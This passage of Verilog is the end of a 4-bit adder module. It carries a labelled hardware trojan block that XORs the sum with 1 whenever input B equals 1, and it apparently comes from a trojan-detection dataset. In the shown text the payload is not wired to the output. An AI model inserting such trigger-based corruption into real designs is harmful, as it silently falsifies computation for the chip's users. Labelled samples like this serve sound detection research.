    wire [4:0] temp_sum;

    assign temp_sum = A + B; //sum of A and B

    always @(*) begin
    if(temp_sum > 15) //truncate if sum is greater than 15
    S = temp_sum[3:0];
    else
    S = temp_sum[3:0];
end

// HT_START
// Trojan Type: Lightweight_Payload_Override
reg htrojan_trig;
reg [3:0] htrojan_pay;
always @(*) begin
    htrojan_trig = (B == 4'h1);
    htrojan_pay = htrojan_trig ? (S ^ 4'h1) : S;
end
// HT_END
endmodule
